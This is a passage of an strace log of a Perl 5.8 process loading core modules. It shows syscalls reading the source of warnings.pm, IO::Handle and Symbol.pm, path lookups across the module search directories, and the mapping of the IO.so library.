\'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
8423  07:23:22.819218 brk(0x81b6000)    = 0x81b6000
8423  07:23:22.819218 brk(0x81b5000)    = 0x81b5000
8423  07:23:22.819317 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
8423  07:23:22.819912 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
8423  07:23:22.820695 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
8423  07:23:22.820829 read(8, "", 4096) = 0
8423  07:23:22.820842 close(8)          = 0
8423  07:23:22.820958 _llseek(6, 412,  <unfinished ...>
8421  07:23:22.820958 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8421  07:23:22.820958 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8421  07:23:22.820958 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8421  07:23:22.820959 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8421  07:23:22.820959 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
8421  07:23:22.820959 waitpid(-1,  <unfinished ...>
8423  07:23:22.820959 <... _llseek resumed> [412], SEEK_SET) = 0
8423  07:23:22.820959 _llseek(6, 0, [412], SEEK_CUR) = 0
8423  07:23:22.820960 close(6)          = 0
8423  07:23:22.820982 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8423  07:23:22.821006 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8423  07:23:22.821035 futex(0xb7f93070, 0x81 /* FUTEX_??? */, 2147483647) = 0
8423  07:23:22.821051 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
8423  07:23:22.821065 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n
8423  07:23:22.821169 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8423  07:23:22.821196 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f97000
8423  07:23:22.821210 mmap2(0xb7f9b000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f9b000
8423  07:23:22.821225 close(6)          = 0
8423  07:23:22.821356 stat64("/etc/perl/IO/Handle.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.821373 stat64("/etc/perl/IO/Handle.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.821387 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.821400 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.821414 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.821427 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.821442 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.821454 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.821467 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.821479 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.821493 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.821506 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
8423  07:23:22.821527 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.821542 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.821554 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.821571 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
8423  07:23:22.831113 stat64("/etc/perl/Symbol.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.831151 stat64("/etc/perl/Symbol.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.831189 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.831217 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.831232 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.831268 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.831296 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.831309 stat64("/usr/lib/perl5/Symbol.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.831323 stat64("/usr/share/perl5/Symbol.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.831335 stat64("/usr/share/perl5/Symbol.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.831348 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.831361 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.831375 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.831388 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
8423  07:23:22.831411 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.831428 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.831441 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.831461 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller 